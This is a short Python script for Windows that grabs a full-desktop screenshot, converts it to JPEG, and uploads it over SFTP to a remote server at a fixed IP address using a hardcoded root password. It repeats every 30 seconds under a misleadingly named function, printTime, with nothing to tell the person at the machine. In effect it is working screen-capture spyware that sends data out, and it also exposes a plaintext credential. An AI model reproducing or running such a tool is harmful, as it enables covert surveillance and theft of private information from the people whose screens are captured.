import win32gui
import win32ui
import win32con
import win32api
import time
from PIL import Image
# from datetime import datetime

def bmpToJpg(file_path):
    im = Image.open("c:\\WINDOWS\\Temp\\screenshot.bmp")
    im.save('c:\\WINDOWS\\Temp\\screenshot.jpg')
# 打印时间函数
def printTime(inc):
    # print(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    # grab a handle to the main desktop window
    hdesktop = win32gui.GetDesktopWindow()

    # determine the size of all monitors in pixel
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    time.sleep(4)
    # create a device context
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    # create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC()

    # create a bitmap object
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    # copy the screen into our memory device context
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    # save the bitmap to a file
    screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')

    # free our objects
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    bmpToJpg("")
    import paramiko

    transport = paramiko.Transport(('10.100.24.221', 22))
    transport.connect(username='root', password='880813')
    import datetime
    curr_time = datetime.datetime.now()
    newfilename= f"{curr_time.month}-{curr_time.day}-{curr_time.hour}-{curr_time.minute}-{curr_time.second}.bmp"
    sftp = paramiko.SFTPClient.from_transport(transport)
    # 将location.py 上传至服务器 /tmp/test.py
    sftp.put('c:\\WINDOWS\\Temp\\screenshot.jpg', f'/tmp/{newfilename}')
    # 将remove_path 下载到本地 local_path
    # sftp.get('remove_path', 'local_path')

    transport.close()

    t = Timer(inc, printTime, (inc,))
    t.start()


if __name__ == '__main__':
    from threading import Timer
    # 5s
    printTime(30)